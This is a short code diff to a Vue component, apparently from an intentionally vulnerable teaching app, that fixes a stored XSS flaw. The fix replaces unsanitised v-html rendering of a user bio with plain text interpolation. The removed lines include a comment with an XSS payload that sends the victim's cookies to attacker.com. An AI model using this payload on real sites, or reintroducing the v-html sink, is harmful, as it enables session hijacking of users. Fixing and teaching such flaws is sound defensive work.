@@ -30,9 +30,7 @@ onMounted(async () => {
           </div>
         </div>
 
-        <!-- 🔴 A03-02 : XSS STOCKÉ — bio chargée depuis la BDD et injectée sans sanitisation -->
-        <!-- Payload : <img src=x onerror="fetch('https://attacker.com?cookie='+document.cookie)"> -->
-        <div class="bio" v-html="user.bio"></div>
+        <div class="bio" style="white-space: pre-line">{{ user.bio }}</div>
       </div>
     </div>
 
